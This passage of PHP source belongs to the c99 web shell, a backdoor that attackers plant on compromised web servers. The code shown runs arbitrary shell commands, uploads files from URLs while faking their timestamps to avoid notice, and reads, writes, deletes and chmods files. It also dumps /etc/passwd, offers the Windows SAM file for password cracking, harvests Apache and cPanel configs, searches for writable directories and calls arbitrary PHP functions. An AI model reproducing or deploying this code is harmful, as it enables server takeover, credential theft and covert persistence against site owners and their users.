      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
      else
      {
       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = "";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
       else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb); //comment it if you want to leave database
    }
   }
  }
}
echo "</td></tr></table>";
if ($sql_sock) {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
  echo "<tr><td><center><b>Affected rows : ".$affected."</center></td></tr>";
}
echo "</table>";
}
//End of SQL Manager

if ($act == "d") {
if (!is_dir($d)) { echo "<center><b>$d is a not a Directory!</b></center>"; }
else {
  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
  if (!$win) {
   echo "<tr><td><b>Owner/Group</b></td><td> ";
   $ow = posix_getpwuid(fileowner($d));
   $gr = posix_getgrgid(filegroup($d));
   $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
  }
  echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table>";
}
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
if ($act == "security") {
  echo "<div class=barheader>.: Server Security Information :.</div>".
       "<table>".
       "<tr><td>Open Base Dir</td><td>".$hopenbasedir."</td></tr>";
  echo "<td>Password File</td><td>";
  if (!$win) {
    if ($nixpasswd) {
      if ($nixpasswd == 1) {$nixpasswd = 0;}
      echo "*nix /etc/passwd:<br>";
      if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
      if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
      echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
      $i = $nixpwd_s;
      while ($i < $nixpwd_e) {
        $uid = posix_getpwuid($i);
        if ($uid) {
          $uid["dir"] = "<a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";
          echo join(":",$uid)."<br>";
        }
        $i++;
      }
    }
    else {echo "<a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a>";}
  }
  else {
    $v = $_SERVER["WINDIR"]."\repair\sam";
    if (file_get_contents($v)) {echo "<td colspan=2><div class=fxerrmsg>You can't crack Windows passwords(".$v.")</div></td></tr>"; }
    else {echo "You can crack Windows passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ?.</td></tr>";}
  }
  echo "</td></tr>";
  echo "<tr><td>Config Files</td><td>";
  if (!$win) {
    $v = array(
        array("User Domains","/etc/userdomains"),
        array("Cpanel Config","/var/cpanel/accounting.log"),
        array("Apache Config","/usr/local/apache/conf/httpd.conf"),
        array("Apache Config","/etc/httpd.conf"),
        array("Syslog Config","/etc/syslog.conf"),
        array("Message of The Day","/etc/motd"),
        array("Hosts","/etc/hosts")
    );
    $sep = "/";
  }
  else {
    $windir = $_SERVER["WINDIR"];
    $etcdir = $windir . "\system32\drivers\etc\\";
    $v = array(
        array("Hosts",$etcdir."hosts"),
        array("Local Network Map",$etcdir."networks"),
        array("LM Hosts",$etcdir."lmhosts.sam"),
    );
    $sep = "\\";
  }
  foreach ($v as $sec_arr) {
    $sec_f = substr(strrchr($sec_arr[1], $sep), 1);
    $sec_d = rtrim($sec_arr[1],$sec_f);
    $sec_full = $sec_d.$sec_f;
    $sec_d = rtrim($sec_d,$sep);
    if (file_get_contents($sec_full)) {
      echo " [ <a href=\"".$surl."act=f&f=$sec_f&d=".urlencode($sec_d)."&ft=txt\"><u><b>".$sec_arr[0]."</b></u></a> ] ";
    }
  }
  echo "</td></tr>";

  function displaysecinfo($name,$value) {
    if (!empty($value)) {
      echo "<tr><td>".$name."</td><td><pre>".wordwrap($value,100)."</pre></td></tr>";
    }
  }
  if (!$win) {
    displaysecinfo("OS Version",myshellexec("cat /proc/version"));
    displaysecinfo("Kernel Version",myshellexec("sysctl -a | grep version"));
    displaysecinfo("Distrib Name",myshellexec("cat /etc/issue.net"));
    displaysecinfo("Distrib Name (2)",myshellexec("cat /etc/*-realise"));
    displaysecinfo("CPU Info",myshellexec("cat /proc/cpuinfo"));
    displaysecinfo("RAM",myshellexec("free -m"));
    displaysecinfo("HDD Space",myshellexec("df -h"));
    displaysecinfo("List of Attributes",myshellexec("lsattr -a"));
    displaysecinfo("Mount Options",myshellexec("cat /etc/fstab"));
    displaysecinfo("cURL installed?",myshellexec("which curl"));
    displaysecinfo("lynx installed?",myshellexec("which lynx"));
    displaysecinfo("links installed?",myshellexec("which links"));
    displaysecinfo("fetch installed?",myshellexec("which fetch"));
    displaysecinfo("GET installed?",myshellexec("which GET"));
    displaysecinfo("perl installed?",myshellexec("which perl"));
    displaysecinfo("Where is Apache?",myshellexec("whereis apache"));
    displaysecinfo("Where is perl?",myshellexec("whereis perl"));
    displaysecinfo("Locate proftpd.conf",myshellexec("locate proftpd.conf"));
    displaysecinfo("Locate httpd.conf",myshellexec("locate httpd.conf"));
    displaysecinfo("Locate my.conf",myshellexec("locate my.conf"));
    displaysecinfo("Locate psybnc.conf",myshellexec("locate psybnc.conf"));
  }
  else {
    displaysecinfo("OS Version",myshellexec("ver"));
    displaysecinfo("Account Settings",myshellexec("net accounts"));
  }
  echo "</table>\n";
}

if ($act == "chmod") {
  $mode = fileperms($d.$f);
  if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
  else {
    $form = TRUE;
    if ($chmod_submit)
  {
   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";}
   else {$err = "Can't chmod to ".$octet.".";}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
  }
}
}
if ($act == "upload") {
  $uploadmess = "";
  $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
  if (empty($uploadpath)) {$uploadpath = $d;}
  elseif (substr($uploadpath,-1) != DIRECTORY_SEPARATOR) {$uploadpath .= DIRECTORY_SEPARATOR;}
  if (!empty($submit)) {
    global $_FILES;
    $uploadfile = $_FILES["uploadfile"];
    if (!empty($uploadfile["tmp_name"])) {
      if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
      else {$destin = $userfilename;}
      if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {
        $uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";
      }
      else { $uploadmess .= "File uploaded successfully!<br>".$uploadpath.$destin; }
    }
    elseif (!empty($uploadurl)) {
      if (!empty($uploadfilename)) {$destin = $uploadfilename;}
      else {
        $destin = explode("/",$destin);
        $destin = $destin[count($destin)-1];
        if (empty($destin)) {
          $i = 0;
          $b = "";
          while(file_exists($uploadpath.$destin)) {
            if ($i > 0) {$b = "_".$i;}
            $destin = "upload".$b;
            $i++;
          }
        }
      }
      if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorrect URL!</b>";}
      else {
        $st = getmicrotime();
        $content = @file_get_contents($uploadurl);
        $dt = round(getmicrotime()-$st,4);
        if (!$content) {$uploadmess .=  "Can't download file!";}
        else {
          if ($filestealth) {$stat = stat($uploadpath.$destin);}
          $fp = fopen($uploadpath.$destin,"w");
          if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
          else {
            fwrite($fp,$content,strlen($content));
            fclose($fp);
            if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
            $uploadmess .= "File saved from ".$uploadurl." !";
          }
        }
      }
    }
    else { echo "No file to upload!"; }
  }
  if ($miniform) {
    echo "<b>".$uploadmess."</b>";
    $act = "ls";
  }
  else {
    echo "<table><tr><td colspan=2 class=barheader>".
         ".: File Upload :.</td>".
         "<td colspan=2>".$uploadmess."</td></tr>".
         "<tr><td><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST>".
         "From Your Computer:</td><td><input name=\"uploadfile\" type=\"file\"></td></tr>".
         "<tr><td>From URL:</td><td><input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"></td></tr>".
         "<tr><td>Target Directory:</td><td><input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"></td></tr>".
         "<tr><td>Target File Name:</td><td><input name=uploadfilename size=25></td></tr>".
         "<tr><td></td><td><input type=checkbox name=uploadautoname value=1 id=df4> Convert file name to lowercase</td></tr>".
         "<tr><td></td><td><input type=submit name=submit value=\"Upload\">".
         "</form></td></tr></table>";
  }
}
if ($act == "delete") {
  $delerr = "";
  foreach ($actbox as $v) {
    $result = FALSE;
    $result = fs_rmobj($v);
    if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
  }
  if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
  $act = "ls";
}
if (!$usefsbuff) {
  if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$usefsbuff\" as TRUE.</center>";}
}
else {
  if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
  elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
  elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
  if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    c99_sess_put($sess_data);
    if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
    $act = "ls";
  }
  elseif ($actarcbuff) {
    $arcerr = "";
    if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
    else {$ext = ".tar.gz";}
    if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
    $cmdline .= " ".$actarcbuff_path;
    $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
    foreach($objects as $v) {
      $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
      if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
      if (is_dir($v)) {
        if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
        $v .= "*";
      }
      $cmdline .= " ".$v;
    }
    $tmp = realpath(".");
    chdir($d);
    $ret = myshellexec($cmdline);
    chdir($tmp);
    if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
    $ret = str_replace("\r\n","\n",$ret);
    $ret = explode("\n",$ret);
    if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
    foreach($sess_data["cut"] as $k=>$v) {
      if (in_array($v,$ret)) {fs_rmobj($v);}
      unset($sess_data["cut"][$k]);
    }
    c99_sess_put($sess_data);
    if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
    $act = "ls";
  }
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    c99_sess_put($sess_data);
    if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
    $act = "ls";
  }
}
if ($act == "cmd") {
  @chdir($chdir);
  if (!empty($submit)) {
    echo "<div class=barheader>.: Result of Command Execution :.</div>";
    $olddir = realpath(".");
    @chdir($d);
    $ret = myshellexec($cmd);
    $ret = convert_cyr_string($ret,"d","w");
    if ($cmd_txt) {
      $rows = count(explode("\r\n",$ret))+1;
      if ($rows < 10) {$rows = 10; }
      if ($msie) { $cols = 113; }
      else { $cols = 117;}
      //echo "<textarea cols=\"$cols\" rows=\"$rows\" readonly>".htmlspecialchars($ret)."</textarea>";
      echo "<div align=left><pre>".htmlspecialchars($ret)."</pre></div>";
    }
    else {echo $ret."<br>";}
    @chdir($olddir);
  }
  else {
    echo "<b>Command Execution</b>";
    if (empty($cmd_txt)) {$cmd_txt = TRUE;}
  }
}
if ($act == "ls") {
  if (count($ls_arr) > 0) { $list = $ls_arr; }
  else {
    $list = array();
    if ($h = @opendir($d)) {
      while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
      closedir($h);
    }
  }
  if (count($list) == 0) { echo "<div class=fxerrmsg>Can't open folder (".htmlspecialchars($d).")!</div>";}
  else {
    $objects = array();
    $vd = "f"; //Viewing mode
    if ($vd == "f") {
      $objects["head"] = array();
      $objects["folders"] = array();
      $objects["links"] = array();
      $objects["files"] = array();
      foreach ($list as $v) {
        $o = basename($v);
        $row = array();
        if ($o == ".") {$row[] = $d.$o; $row[] = "CURDIR";}
        elseif ($o == "..") {$row[] = $d.$o; $row[] = "UPDIR";}
        elseif (is_dir($v)) {
          if (is_link($v)) {$type = "LINK";}
          else {$type = "DIR";}
          $row[] = $v;
          $row[] = $type;
        }
        elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
        $row[] = filemtime($v);
        if (!$win) {
          $ow = posix_getpwuid(fileowner($v));
          $gr = posix_getgrgid(filegroup($v));
          $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));
        }
        $row[] = fileperms($v);
        if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
        elseif (is_link($v)) {$objects["links"][] = $row;}
        elseif (is_dir($v)) {$objects["folders"][] = $row;}
        elseif (is_file($v)) {$objects["files"][] = $row;}
        $i++;
      }
      $row = array();
      $row[] = "<b>Name</b>";
      $row[] = "<b>Size</b>";
      $row[] = "<b>Date Modified</b>";
      if (!$win) {$row[] = "<b>Owner/Group</b>";}
      $row[] = "<b>Perms</b>";
      $row[] = "<b>Action</b>";
      $parsesort = parsesort($sort);
      $sort = $parsesort[0].$parsesort[1];
      $k = $parsesort[0];
      if ($parsesort[1] != "a") {$parsesort[1] = "d";}
      $y = " <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";
      $y .= "<img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>";
      $row[$k] .= $y;
      for($i=0;$i<count($row)-1;$i++) {
        if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}
      }
      $v = $parsesort[0];
      usort($objects["folders"], "tabsort");
      usort($objects["links"], "tabsort");
      usort($objects["files"], "tabsort");
      if ($parsesort[1] == "d") {
        $objects["folders"] = array_reverse($objects["folders"]);
        $objects["files"] = array_reverse($objects["files"]);
      }
      $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
      $tab = array();
      $tab["cols"] = array($row);
      $tab["head"] = array();
      $tab["folders"] = array();
      $tab["links"] = array();
      $tab["files"] = array();
      $i = 0;
      foreach ($objects as $a) {
        $v = $a[0];
        $o = basename($v);
        $dir = dirname($v);
        if ($disp_fullpath) {$disppath = $v;}
        else {$disppath = $o;}
        $disppath = str2mini($disppath,60);
        if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
        elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
        foreach ($regxp_highlight as $r) {
          if (ereg($r[0],$o)) {
            if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
            else {
              $r[1] = round($r[1]);
              $isdir = is_dir($v);
              if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir)) {
                if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}
                $disppath = $r[2].$disppath.$r[3];
                if ($r[4]) {break;}
              }
            }
          }
        }
        $uo = urlencode($o);
        $ud = urlencode($dir);
        $uv = urlencode($v);
        $row = array();
        if ($o == ".") {
          $row[] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."act=img&img=small_dir\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "CURDIR";
        }
        elseif ($o == "..") {
          $row[] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."act=img&img=ext_lnk\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "UPDIR";
        }
        elseif (is_dir($v)) {
          if (is_link($v)) {
            $disppath .= " => ".readlink($v);
            $type = "LINK";
            $row[] = "<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."act=img&img=ext_lnk\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          else {
            $type = "DIR";
            $row[] =  "<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."act=img&img=small_dir\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          $row[] = $type;
        }
        elseif(is_file($v)) {
          $ext = explode(".",$o);
          $c = count($ext)-1;
          $ext = $ext[$c];
          $ext = strtolower($ext);
          $row[] =  "<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$disppath."</a>";
          $row[] = view_size($a[1]);
        }
        $row[] = date("d.m.Y H:i:s",$a[2]);
        if (!$win) {$row[] = $a[3];}
        $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";
        if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
        else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
        if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" border=\"0\"></a>&nbsp;".$checkbox;}
        else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\" border=\"0\"></a>&nbsp;".$checkbox;}
        if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
        elseif (is_link($v)) {$tab["links"][] = $row;}
        elseif (is_dir($v)) {$tab["folders"][] = $row;}
        elseif (is_file($v)) {$tab["files"][] = $row;}
        $i++;
      }
    }
    // Compiling table
    $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
    echo "<div class=barheader>.: ";
    if (!empty($fx_infohead)) { echo $fx_infohead; }
    else { echo "Directory List (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders)"; }
    echo " :.</div>\n";
    echo "<form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=act value=\"".$dspact."\"><input type=hidden name=d value=".$d.">".
         "<table class=explorer>";
    foreach($table as $row) {
      echo "<tr>";
      foreach($row as $v) {echo "<td>".$v."</td>";}
      echo "</tr>\r\n";
    }
    echo "</table>".
         "<script>".
         "function ls_setcheckboxall(status) {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id <= num) { document.getElementById('actbox'+id).checked = status; id++; }".
         "}".
         "function ls_reverse_all() {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id <= num) { document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; id++; }".
         "}".
         "</script>".
         "<div align=\"right\">".
         "<input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\">".
         "<img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";
    if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff)) {
      echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"fx_archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    echo "<select name=act><option value=\"".$act."\">With selected:</option>";
    echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
    echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
    if ($usefsbuff) {
      echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";
      echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";
      echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";
    }
    echo "</select>&nbsp;<input type=submit value=\"Confirm\"></div>";
    echo "</form>";
  }
}

if ($act == "phpfsys") {
  echo "<div align=left>";
  $fsfunc = $phpfsysfunc;
  if ($fsfunc=="copy") {
    if (!copy($arg1, $arg2)) { echo "Failed to copy $arg1...\n";}
    else { echo "<b>Success!</b> $arg1 copied to $arg2\n"; }
  }
  elseif ($fsfunc=="rename") {
    if (!rename($arg1, $arg2)) { echo "Failed to rename/move $arg1!\n";}
    else { echo "<b>Success!</b> $arg1 renamed/moved to $arg2\n"; }
  }
  elseif ($fsfunc=="chmod") {
    if (!chmod($arg1,$arg2)) { echo "Failed to chmod $arg1!\n";}
    else { echo "<b>Perm for $arg1 changed to $arg2!</b>\n"; }
  }
  elseif ($fsfunc=="read") {
    $hasil = @file_get_contents($arg1);
    echo "<b>Filename:</b> $arg1<br>";
    echo "<textarea cols=150 rows=20>";
    echo $hasil;
    echo "</textarea>\n";
  }
  elseif ($fsfunc=="write") {
    if(@file_put_contents($d.$arg1,$arg2)) {
      echo "<b>Saved!</b> ".$d.$arg1;
    }
    else { echo "<div class=fxerrmsg>Couldn't write to $arg1!</div>"; }
  }
  elseif ($fsfunc=="downloadbin") {
    $handle = fopen($arg1, "rb");
    $contents = '';
    while (!feof($handle)) {
      $contents .= fread($handle, 8192);
    }
    $r = @fopen($d.$arg2,'w');
    if (fwrite($r,$contents)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
    else { echo "<div class=fxerrmsg>Couldn't write to ".$d.$arg2."!</div>"; }
    fclose($r);
    fclose($handle);
  }
  elseif ($fsfunc=="download") {
    $text = implode('', file($arg1));
    if ($text) {
      $r = @fopen($d.$arg2,'w');
      if (fwrite($r,$text)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
      else { echo "<div class=fxerrmsg>Couldn't write to ".$d.$arg2."!</div>"; }
      fclose($r);
    }
    else { echo "<div class=fxerrmsg>Couldn't download from $arg1!</div>";}
  }
  elseif ($fsfunc=='mkdir') {
    $thedir = $d.$arg1;
    if ($thedir != $d) {
      if (file_exists($thedir)) { echo "<b>Already exists:</b> ".htmlspecialchars($thedir); }
      elseif (!mkdir($thedir)) { echo "<b>Access denied:</b> ".htmlspecialchars($thedir); }
      else { echo "<b>Dir created:</b> ".htmlspecialchars($thedir);}
    }
    else { echo "Couldn't create current dir:<b> $thedir</b>"; }
  }
  elseif ($fsfunc=='fwritabledir') {
    function recurse_dir($dir,$max_dir) {
      global $dir_count;
      $dir_count++;
      if( $cdir = @dir($dir) ) {
        while( $entry = $cdir-> read() ) {
          if( $entry != '.' && $entry != '..' ) {
            if(is_dir($dir.$entry) && is_writable($dir.$entry) ) {
             if ($dir_count > $max_dir) { return; }
              echo "[".$dir_count."] ".$dir.$entry."\n";
              recurse_dir($dir.$entry.DIRECTORY_SEPARATOR,$max_dir);
            }
          }
        }
        $cdir->close();
      }
    }
    if (!$arg1) { $arg1 = $d; }
    if (!$arg2) { $arg2 = 10; }
    echo "<b>Writable directories (Max: $arg2) in:</b> $arg1<br>";
    echo "<pre>";
    recurse_dir($arg1,$arg2);
    echo "</pre>";
    $total = $dir_count - 1;
    echo "<b>Founds:</b> ".$total." of <b>Max</b> $arg2";
  }
  else {
    if (!$arg1) { echo "<div class=fxerrmsg>No operation! Please fill parameter [A]!</div>\n"; }
    else {
      if ($hasil = $fsfunc($arg1)) {
        echo "<b>Result of $fsfunc $arg1:</b><br>";
        if (!is_array($hasil)) { echo "$hasil\n"; }
        else {
          echo "<pre>";
          foreach ($hasil as $v) { echo $v."\n"; }
          echo "</pre>";
        }
      }
      else { echo "<div class=fxerrmsg>$fsfunc $arg1 failed!</div>\n"; }
    }
  }
  echo "</div>\n";
}

if ($act == "f") {
  echo "<div align=left>";
  if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {
    if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
    else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
  }
  else {
    $r = @file_get_contents($d.$f);
